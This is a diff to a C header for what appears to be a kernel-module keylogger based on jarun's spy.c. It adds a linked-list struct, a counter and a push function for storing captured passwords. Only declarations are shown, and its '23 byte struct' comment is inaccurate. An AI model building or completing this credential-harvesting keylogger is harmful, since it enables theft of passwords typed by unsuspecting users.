@@ -5,6 +5,9 @@
  * 	https://github.com/jarun/spy/blob/master/spy.c
  */
 
+
+extern int password_count;
+
 static const char *keymap[][2] = {
 	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
 	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
@@ -47,5 +50,12 @@ ssize_t read_simple(struct file *filp,char *buf,size_t count,loff_t *offp );
 int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data);
 int init (void);
 void cleanup(void);
+
+struct password{//23 byte struct
+	char* pw; // The passwords won't be longer than 15 characters
+	struct password* next;
+};
+
+void push(struct password** head, char* password_value);
 
 #endif
